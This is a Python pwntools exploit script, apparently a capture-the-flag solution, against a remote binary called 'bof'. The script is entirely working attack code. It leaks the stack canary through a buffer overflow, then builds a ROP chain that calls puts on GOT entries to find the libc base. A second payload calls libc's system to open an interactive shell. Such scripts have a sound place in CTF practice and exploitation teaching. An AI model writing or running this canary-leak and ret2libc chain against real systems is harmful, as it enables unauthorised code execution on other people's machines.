from pwn import *

context.binary = elf = ELF('./bof')
libc = ELF('./libc.so')

#Gadgets
pop_rdi = 0x0000000000401343
ret = 0x000000000040101a

#io = process()
#gdb.attach(io, api=True)
io = remote('pwn.h4ckingga.me', 10002)

# Round 1
io.recvuntil(b'name?\n')
io.sendline(b'i'*280)
io.recvline()
canary = u64(io.recv(7).rjust(8, b'\0'))
log.info(f'Canary: {hex(canary)}')

io.recvuntil(b' : ')
payload = b'i'*264 + p64(canary) + p64(0)
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts'])
payload += p64(pop_rdi) + p64(elf.got['gets']) + p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
io.sendline(payload)

puts = u64(io.recvline(keepends=False).ljust(8, b'\0'))
printf = u64(io.recvline(keepends=False).ljust(8, b'\0'))
gets = u64(io.recvline(keepends=False).ljust(8, b'\0'))
libc.address = puts - libc.sym['puts']
log.info(f'''puts: {hex(puts)}
printf: {hex(printf)}
gets: {hex(gets)}
Libc base: {hex(libc.address)}''')

# Round 2
io.recvuntil(b'name?\n')
io.sendline(b'i'*280)
io.recvline()
canary = u64(io.recv(7).rjust(8, b'\0'))
log.info(f'Canary: {hex(canary)}')

io.recvuntil(b' : ')
payload = b'i'*264 + p64(canary) + p64(0) + p64(ret)
payload += p64(pop_rdi) + p64(libc.address+0x1b75aa) + p64(libc.sym['system'])
payload += p64(elf.sym['main'])
io.sendline(payload)

io.interactive()